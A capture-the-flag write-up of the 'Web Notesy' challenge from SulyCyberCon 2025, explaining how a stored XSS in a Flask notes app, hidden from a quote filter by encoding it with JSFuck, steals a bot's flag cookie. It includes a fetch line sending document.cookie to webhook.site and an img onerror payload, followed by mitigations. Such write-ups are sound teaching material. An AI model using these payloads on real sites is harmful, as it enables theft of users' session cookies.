# Web Notesy Challenge Write-up - SulyCyberCon #2025

## Challenge Overview
This was a web challenge featuring a note-taking application with a reporting feature. The goal was to exploit an XSS vulnerability combined with a bot carrying the flag in its cookies.

## Technical Analysis

### Application Components
1. Flask web application for creating and viewing notes
2. Content filtering system that blocks quotes (`'`, `"`, `` ` ``)
3. Report feature with a Selenium bot that visits reported URLs
4. Flag stored in bot's cookies

## Vulnerability Discovery

### 1. Content Validation
The application implements basic filtering in `app.py`:
```python
def is_safe_content(content):
    decoded_content = unquote(content)
    if re.search(r'[\'"`]', decoded_content, re.IGNORECASE):
        return False
    return True
```
This only blocks quotes but allows other HTML tags and JavaScript execution.

### 2. Unsafe Content Rendering
In `view_note.html`, content is rendered without escaping:
```html
<p>{{ note['content'] | safe }}</p>
```

### 3. Bot Behavior
The bot (`bot.py`) follows a specific sequence:

```python
def bot_runner(link):
    client.get("http://127.0.0.1:1337")
    cookie = {
        "name": "FLAG",
        "value": open('/flag.txt').read().strip(),
        "domain": "127.0.0.1",
        "path": "/"
    }
    client.add_cookie(cookie)
    client.get(link)
```
## Exploitation Steps

### 1. Setting Up Request Catcher
- Instead of setting up a server, we use [webhook.site](https://webhook.site/)
- This provides a free URL to capture incoming HTTP requests
- Perfect for receiving exfiltrated data from XSS payloads

### 2. Bypassing Quote Filters with JSFuck
1. Create base payload to exfiltrate cookies:
   ```javascript
   fetch("https://webhook.site/xxxxxx/xxxxxx?c="+btoa(document.cookie));
   ```

2. Convert payload using [JSFuck](https://jsfuck.com/)
   - JSFuck converts JavaScript code to code using only 6 characters: `[]()!+`
   - This effectively bypasses quote filters since it doesn't use any quotes

3. Create the final XSS payload:
   ```html
   <img src=x onerror=[][(![]+[])<snip>...<snip>[+!+[]]]>
   ```
   Note: The actual JSFuck output is much longer but achieves the same result

### 3. Executing the Attack
1. Create a new note with the JSFuck XSS payload
2. Get the note's unique URL
3. Submit URL to the report feature
4. Monitor webhook.site dashboard

### 4. Getting the Flag
When the bot visits our note:
1. Flag cookie is set
2. XSS payload executes
3. Cookie is base64 encoded and sent to webhook.site
4. Decode the base64 parameter from the received request to get the flag

## Why This Works
1. Quote filter bypass:
   - JSFuck uses only `[]()!+` characters
   - No quotes needed for JavaScript execution
   
2. Cookie exfiltration:
   - Bot adds flag cookie before visiting our URL
   - Cookie isn't marked HttpOnly
   - JavaScript can access and exfiltrate it

## Mitigation
To prevent this attack:
1. Implement proper HTML escaping
2. Remove `| safe` from templates
3. Set HttpOnly flag on sensitive cookies
4. Implement Content Security Policy (CSP)
5. Use better input sanitization beyond just filtering quotes

## Conclusion
This challenge demonstrated:
- Creative ways to bypass character filters using JSFuck
- Importance of proper XSS mitigation
- Value of free tools like webhook.site for CTF solving
- Why HttpOnly flags are crucial for sensitive cookies


